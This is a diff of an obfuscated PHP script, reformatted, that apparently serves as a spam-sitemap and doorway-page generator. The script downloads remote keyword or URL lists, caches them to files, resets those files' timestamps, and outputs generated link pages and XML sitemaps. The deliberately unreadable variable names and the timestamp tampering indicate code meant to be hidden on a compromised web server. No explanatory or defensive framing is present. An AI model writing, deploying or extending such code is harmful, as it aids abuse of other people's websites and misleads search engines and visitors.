@@ -994,212 +994,236 @@ function l1P9LVD($l15tGX=''){
     $l1DLH=$l1VQ."?listing=%s";
     $l1TE9=substr(md5($l1xUB),0,6);
     $l1GH0rfZ=array("extensions"=>$l1T2,"url_rules"=>$l1gfDiJL,"wordlist_array"=>$l1NhADdH,"url_prefix"=>$l1GRfrF8,"url_prefix_qm"=>$l1imRR,);
+
     if($l1VC2k){
-    $l1US=array();
-    $l1O1M7v=array();
-    $l1R=array();
-    $l1l=in_array($l1uVp,array(1,3));
-    if($l1uVp==1){
-    $l1R=l19($l1f1oojq);
-    }if($l1uVp==2){
-    $l1US=l1HsDyi2($l1TE9,$l1xUB,$l13GLz);
-    }if($l1uVp==3){
-    $l1R=l19($l1f1oojq);
-    $l1US=l1HsDyi2($l1TE9,$l1xUB,$l13GLz);
-    }if($l1pods5){
-    $l1bq2wMI=array();
-    if($l1l){
-    $l1bq2wMI[]=sprintf("<%s-%s>",$l1Qhzk2,implode(',',$l1R["a"]));
-    }
-    $l1EE=null;
-    $l1VuF=array();
-    foreach($l1US as$l1MC=>$l1N37tH){
-    $l1VuF[]=$l1MC;
-    if($l1EE===null){
-    $l1EE=implode(',',$l1N37tH);
-    }}if($l1EE!=null&&!empty($l1VuF)){
-    $l1bq2wMI[]=sprintf("%s-%s",implode(',',$l1VuF),$l1EE);
-    }if(!empty($l1bq2wMI)){
-    $l1GlKWj=explode("|||",download(sprintf($l1DLH,implode('/',$l1bq2wMI))));
-    foreach($l1GlKWj as$l10PuVe){
-    $l1x2JI9S=explode("---",$l10PuVe);
-    if(count($l1x2JI9S)==2){
-    $l1O1M7v[$l1x2JI9S[0]]=array();
-    $l10=explode("+++",$l1x2JI9S[1]);
-    foreach($l10 as$l1mr04t3){
-    $l1UlwA=explode('=>',$l1mr04t3);
-    if(count($l1UlwA)==2){
-    $l1O1M7v[$l1x2JI9S[0]][$l1UlwA[0]]=$l1UlwA[1];
-    }}}}}}
-    $l1toTW="<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n<title>list</title>\n</head>\n<body>\n%s\n</body>\n</html>";
-    $l1Y='';
+        $l1US = array();
+        $l1O1M7v = array();
+        $l1R = array();
+        $l1l = in_array($l1uVp,array(1,3));
 
-    if($l1l){
-        foreach($l1R["a"]as$l1s8amxT=>$l1oGP){
-            if($l1pods5&&isset($l1O1M7v[$l1Qhzk2])&&isset($l1O1M7v[$l1Qhzk2][$l1oGP])){
-                $l1Y.=$l1O1M7v[$l1Qhzk2][$l1oGP]."<br>";
+        if($l1uVp==1){
+        $l1R=l19($l1f1oojq);
+        }
+        if($l1uVp==2){
+        $l1US=l1HsDyi2($l1TE9,$l1xUB,$l13GLz);
+        }
+        if($l1uVp==3){
+        $l1R=l19($l1f1oojq);
+        $l1US=l1HsDyi2($l1TE9,$l1xUB,$l13GLz);
+        }
+        if($l1pods5){
+            $l1bq2wMI=array();
+            if($l1l){
+                $l1bq2wMI[]=sprintf("<%s-%s>",$l1Qhzk2,implode(',',$l1R["a"]));
             }
-                $l1Y.="$l1Ni6{$l1R["b"][$l1s8amxT]}"."<br>";
-        }
-    }
-
-    foreach($l1US as$l1p=>$l1X1r){
-        foreach($l1X1r as$l1xv){
-            if($l1pods5&&isset($l1O1M7v[$l1p])&&isset($l1O1M7v[$l1p][$l1xv])){
-                $l1Y.=$l1O1M7v[$l1p][$l1xv]."<br>";
+            $l1EE=null;
+            $l1VuF=array();
+            foreach($l1US as$l1MC=>$l1N37tH){
+                $l1VuF[]=$l1MC;
+                if($l1EE===null){
+                    $l1EE=implode(',',$l1N37tH);
+                }
             }
-            $l1Y.=l1guW(array($l1p,$l1xv,'',''),$l1GH0rfZ,1)."<br>";
+
+            if($l1EE!=null&&!empty($l1VuF)){
+                $l1bq2wMI[]=sprintf("%s-%s",implode(',',$l1VuF),$l1EE);
+            }
+
+            if(!empty($l1bq2wMI)){
+                $l1GlKWj=explode("|||",download(sprintf($l1DLH,implode('/',$l1bq2wMI))));
+                foreach($l1GlKWj as$l10PuVe){
+                    $l1x2JI9S=explode("---",$l10PuVe);
+                    if(count($l1x2JI9S)==2){
+                        $l1O1M7v[$l1x2JI9S[0]]=array();
+                        $l10=explode("+++",$l1x2JI9S[1]);
+                        foreach($l10 as$l1mr04t3){
+                            $l1UlwA=explode('=>',$l1mr04t3);
+                            if(count($l1UlwA)==2){
+                                $l1O1M7v[$l1x2JI9S[0]][$l1UlwA[0]]=$l1UlwA[1];
+                            }
+                        }
+                    }
+                }
+            }
         }
+        $l1toTW="<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n<title>list</title>\n</head>\n<body>\n%s\n</body>\n</html>";
+        $l1Y='';
+
+        if($l1l){
+            foreach($l1R["a"]as$l1s8amxT=>$l1oGP){
+                if($l1pods5&&isset($l1O1M7v[$l1Qhzk2])&&isset($l1O1M7v[$l1Qhzk2][$l1oGP])){
+                    $l1Y.=$l1O1M7v[$l1Qhzk2][$l1oGP]."<br>";
+                }
+                    $l1Y.="$l1Ni6{$l1R["b"][$l1s8amxT]}"."<br>";
+            }
+        }
+
+        foreach($l1US as$l1p=>$l1X1r){
+            foreach($l1X1r as$l1xv){
+                if($l1pods5&&isset($l1O1M7v[$l1p])&&isset($l1O1M7v[$l1p][$l1xv])){
+                    $l1Y.=$l1O1M7v[$l1p][$l1xv]."<br>";
+                }
+                $l1Y.=l1guW(array($l1p,$l1xv,'',''),$l1GH0rfZ,1)."<br>";
+            }
+        }
+
+        echo sprintf($l1toTW,$l1Y);
+        exit();
     }
 
-    echo sprintf($l1toTW,$l1Y);
-    exit();
-    }if($l1t||$l1FP8t||$l1g){
-    $l1VBV="\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
-    $l1a="<loc>%s</loc>";
+    if($l1t||$l1FP8t||$l1g){
+        $l1VBV="\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
+        $l1a="<loc>%s</loc>";
 
-    if($l1g){
-        $l1jHQLt=array($l1f1oojq);
-        if($l1bS3es!=''){
-            $l1jHQLt[]=$l1Ni6;
-        }
-        $l1WEPla = download($l1f1oojq);
-        if($l1WEPla!=''){
-            $l1jHQLt=array_merge($l1jHQLt,l1BSTEtn($l1WEPla));
-            $l1jHQLt=array_unique($l1jHQLt);
-        }
-        header(sprintf($l13lq1,'x'));
-        echo $l1VBV;
-        @write_file($l1sH,$l1VBV);
-        $l1Nc=array();
+        if($l1g){
+            $l1jHQLt=array($l1f1oojq);
+            if($l1bS3es!=''){
+                $l1jHQLt[]=$l1Ni6;
+            }
+            $l1WEPla = download($l1f1oojq);
+            if($l1WEPla!=''){
+                $l1jHQLt=array_merge($l1jHQLt,l1BSTEtn($l1WEPla));
+                $l1jHQLt=array_unique($l1jHQLt);
+            }
+            header(sprintf($l13lq1,'x'));
+            echo $l1VBV;
+            @write_file($l1sH,$l1VBV);
+            $l1Nc=array();
 
-        if(!empty($l1jHQLt)){
-            foreach($l1jHQLt as$l1LtvM5){
-            if(count($l1Nc)>=100){
-                $l1gn=implode('',$l1Nc);
+            if(!empty($l1jHQLt)){
+                foreach($l1jHQLt as$l1LtvM5){
+                if(count($l1Nc)>=100){
+                    $l1gn=implode('',$l1Nc);
+                    echo $l1gn;
+                    @write_file($l1sH,$l1gn,'a');
+                    $l1gn='';
+                    $l1Nc=array();
+                }
+                $l1Nc[] = sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>monthly</changefreq>\n\t\t</url>",sprintf($l1a,l1kw6(preg_match("/^https?\:\/\//si",$l1LtvM5)?$l1LtvM5:"$l1Ni6$l1LtvM5")),date("Y-m-d"));
+                }
+            }
+            if(!empty($l1Nc)){
+                $l1gn = implode('',$l1Nc);
                 echo $l1gn;
                 @write_file($l1sH,$l1gn,'a');
                 $l1gn='';
                 $l1Nc=array();
             }
-            $l1Nc[] = sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>monthly</changefreq>\n\t\t</url>",sprintf($l1a,l1kw6(preg_match("/^https?\:\/\//si",$l1LtvM5)?$l1LtvM5:"$l1Ni6$l1LtvM5")),date("Y-m-d"));
-            }
-        }
-        if(!empty($l1Nc)){
-            $l1gn = implode('',$l1Nc);
-            echo $l1gn;
-            @write_file($l1sH,$l1gn,'a');
-            $l1gn='';
-            $l1Nc=array();
+
+            $l1FiZB="\n\t</urlset>";
+            echo $l1FiZB;
+            @write_file($l1sH,$l1FiZB,'a');
+            exit();
         }
 
-        $l1FiZB="\n\t</urlset>";
-        echo $l1FiZB;
-        @write_file($l1sH,$l1FiZB,'a');
-        exit();
-    }
+        $l1Z4k=$l1Ni6;
+        $l1yaqM=isset($_GET["html"])?(int)($_GET["html"]):'';
 
-    $l1Z4k=$l1Ni6;
-    $l1yaqM=isset($_GET["html"])?(int)($_GET["html"]):'';
+        if(file_exists($l1TE9)){
+            $l14XZNk = file_get_contents($l1TE9);
+        }else{
+            $l14XZNk = download($l1xUB);
+            @write_file($l1TE9,$l14XZNk);
+            @change_timestamp($l1TE9);
+        }
 
-    if(file_exists($l1TE9)){
-        $l14XZNk = file_get_contents($l1TE9);
-    }else{
-        $l14XZNk = download($l1xUB);
-        @write_file($l1TE9,$l14XZNk);
-        @change_timestamp($l1TE9);
-    }
+        $l14XZNk=trim($l14XZNk,'|');
 
-    $l14XZNk=trim($l14XZNk,'|');
-    if($l14XZNk!=''){
-    $l1US=explode('|',$l14XZNk);
-    if(is_numeric($l1yaqM)&&$l1yaqM>0){
-    $l1SSAANd="\x3c!DOCTYPE html>\n\x3chtml>\n\x3chead>\n\t\x3cmeta charset=\"utf-8\">\n\t\x3cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\x3ctitle>\x3c/title>\n\x3c/head>\n\x3cbody>";
-    foreach($l1US as$l1k0){
-    $l1A=explode('-',$l1k0);
-    for($l17K=0;
-    $l17K<$l1yaqM;
-    $l17K++){
-    $l1VV=mt_rand(1,$l1A[2]);
-    $l11ia=l1guW(array($l1A[0],$l1VV,'',''),$l1GH0rfZ,1);
-    $l1SSAANd.=sprintf('<a href="%s" target="_blank">%s</a><br>'."\n",$l11ia,$l11ia);
-    }}echo $l1SSAANd."\n\x3c/body>\n\x3c/html>";
-    exit();
-    }
-    $l1EYB=$l1r;
-    $l1quNG=$l1yBQ;
-    $l1IHKBWW=$l1qsb509;
-    $l1H=$l1XwKTlO;
-    $l1lhlbf3=$l1Ni6;
-    $l1HiS=$l1Ni6;
-    $l1g2MIU='';
-    $l1B=0;
-    foreach($l1US as$l1FQ9sMt=>$l1TXqIy2){
-    $l1B+=(int)substr($l1TXqIy2,strrpos($l1TXqIy2,'-')+1);
-    }if($l1B<=0){
-    exit("nodata");
-    }
-    $l15=ceil($l1B/$l1EYB);
-    $l1EYB=$l1IHKBWW>$l15?$l1EYB:$l1EYB;
-    $l1XfT=$l1gR0e=$l1m7a=$l1IHKBWW;
-    $l1NVN7=array();
-    $l1u1Pi=0;
-    header(sprintf($l13lq1,'x'));
+        if($l14XZNk != ''){
+            $l1US=explode('|',$l14XZNk);
 
-    echo $l1VBV;
-    if(!empty($l1US)){
-        $l1QEn=0;
-        $l1ut=$l17x=0;
-        foreach($l1US as $l1k0){
-            if($l1ut>=$l1EYB){
-                break;
+            if(is_numeric($l1yaqM)&&$l1yaqM>0){
+                $l1SSAANd="\x3c!DOCTYPE html>\n\x3chtml>\n\x3chead>\n\t\x3cmeta charset=\"utf-8\">\n\t\x3cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\x3ctitle>\x3c/title>\n\x3c/head>\n\x3cbody>";
+                foreach($l1US as$l1k0){
+                    $l1A=explode('-',$l1k0);
+                    for($l17K=0;$l17K<$l1yaqM;$l17K++){
+                        $l1VV=mt_rand(1,$l1A[2]);
+                        $l11ia=l1guW(array($l1A[0],$l1VV,'',''),$l1GH0rfZ,1);
+                        $l1SSAANd.=sprintf('<a href="%s" target="_blank">%s</a><br>'."\n",$l11ia,$l11ia);
+                    }
+                }
+                echo $l1SSAANd."\n\x3c/body>\n\x3c/html>";
+                exit();
             }
 
-            $l1L2r = explode('-',$l1k0);
-            $l112sTd = $l1L2r[0];
-            $l1rjnW = $l1L2r[2];
-            $l1JHedwW = l1spc7n9($l1rjnW-1,$l1IHKBWW,$l1VqK,$l19);
+            $l1EYB=$l1r;
+            $l1quNG=$l1yBQ;
+            $l1IHKBWW=$l1qsb509;
+            $l1H=$l1XwKTlO;
+            $l1lhlbf3=$l1Ni6;
+            $l1HiS=$l1Ni6;
+            $l1g2MIU='';
+            $l1B=0;
 
-            if(!empty($l1JHedwW)){
-                foreach($l1JHedwW as$l1wq){
+            foreach($l1US as$l1FQ9sMt=>$l1TXqIy2){
+                $l1B += (int)substr($l1TXqIy2,strrpos($l1TXqIy2,'-')+1);
+            }
+
+            if($l1B<=0){
+                exit("nodata");
+            }
+
+            $l15=ceil($l1B/$l1EYB);
+            $l1EYB=$l1IHKBWW>$l15?$l1EYB:$l1EYB;
+            $l1XfT=$l1gR0e=$l1m7a=$l1IHKBWW;
+            $l1NVN7=array();
+            $l1u1Pi=0;
+            header(sprintf($l13lq1,'x'));
+
+            echo $l1VBV;
+            if(!empty($l1US)){
+                $l1QEn=0;
+                $l1ut=$l17x=0;
+                foreach($l1US as $l1k0){
                     if($l1ut>=$l1EYB){
                         break;
                     }
-                    if($l1u1Pi>50){
+
+                    $l1L2r = explode('-',$l1k0);
+                    $l112sTd = $l1L2r[0];
+                    $l1rjnW = $l1L2r[2];
+                    $l1JHedwW = l1spc7n9($l1rjnW-1,$l1IHKBWW,$l1VqK,$l19);
+
+                    if(!empty($l1JHedwW)){
+                        foreach($l1JHedwW as$l1wq){
+                            if($l1ut>=$l1EYB){
+                                break;
+                            }
+                            if($l1u1Pi>50){
+                                $l1kLHy=implode('',$l1NVN7);
+                                echo $l1kLHy;
+                                $l1NVN7=array();
+                                $l1u1Pi=0;
+                            }
+
+                            $l1JX11vj='';
+                            $l1JX11vj.="<url>";
+                            $l1JX11vj.=sprintf($l1a,l1kw6(l1guW(array($l112sTd,$l1wq,'',''),1)));
+                            $l1JX11vj.="<lastmod>".date("Y-m-d")."</lastmod>";
+                            $l1JX11vj.="<changefreq>weekly</changefreq>";
+                            $l1JX11vj.="</url>";
+                            $l1NVN7[]=$l1JX11vj;
+                            $l1ut++;
+                            $l1u1Pi++;
+                        }
+
                         $l1kLHy=implode('',$l1NVN7);
                         echo $l1kLHy;
                         $l1NVN7=array();
-                        $l1u1Pi=0;
                     }
-
-                    $l1JX11vj='';
-                    $l1JX11vj.="<url>";
-                    $l1JX11vj.=sprintf($l1a,l1kw6(l1guW(array($l112sTd,$l1wq,'',''),1)));
-                    $l1JX11vj.="<lastmod>".date("Y-m-d")."</lastmod>";
-                    $l1JX11vj.="<changefreq>weekly</changefreq>";
-                    $l1JX11vj.="</url>";
-                    $l1NVN7[]=$l1JX11vj;
-                    $l1ut++;
-                    $l1u1Pi++;
                 }
-
-                $l1kLHy=implode('',$l1NVN7);
-                echo $l1kLHy;
-                $l1NVN7=array();
             }
-        }
-    }
 
-    $l1NVN7[]="\n\t</urlset>";
-    $l1I0=implode('',$l1NVN7);
-    $l1NVN7=array();
-    echo $l1I0;
-    }else{
-        echo "feterr:".$l1xUB;
+            $l1NVN7[]="\n\t</urlset>";
+            $l1I0=implode('',$l1NVN7);
+            $l1NVN7=array();
+            echo $l1I0;
+        }else{
+            echo "feterr:".$l1xUB;
+            exit();
+        }
+        
         exit();
-    }
-    
-    exit();
     }
 
     $l1B3=l1g1oAl2($l1c9,$l1gfDiJL,$l1T2);
